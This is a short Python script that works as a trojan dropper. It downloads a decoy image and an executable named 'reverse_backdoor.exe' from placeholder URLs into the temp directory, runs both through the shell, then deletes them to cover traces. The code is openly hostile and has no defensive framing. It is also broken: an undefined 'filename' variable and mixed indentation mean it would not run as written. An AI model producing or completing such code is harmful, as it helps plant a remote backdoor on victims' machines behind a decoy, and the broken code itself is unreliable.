import requests
import subprocess
import os
import tempfile

def download(url):
	get_request = requests.get(url)
	#print (get_request.content)
	#print (get_request)
  with open(filename,"wb") as out_file:
		out_file.write(get_request.content)

temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)

download("http://localhost where file #ex.car.jpg is stored")
subprocess.Popen("car.jpg",shell=True)

download("http://localhost where reverse_backdoor.exe is stored")
subprocess.call("reverse_backdoor.exe",shell=True)

os.remove("car.jpg")
os.remove("reverse_backdoor.exe")
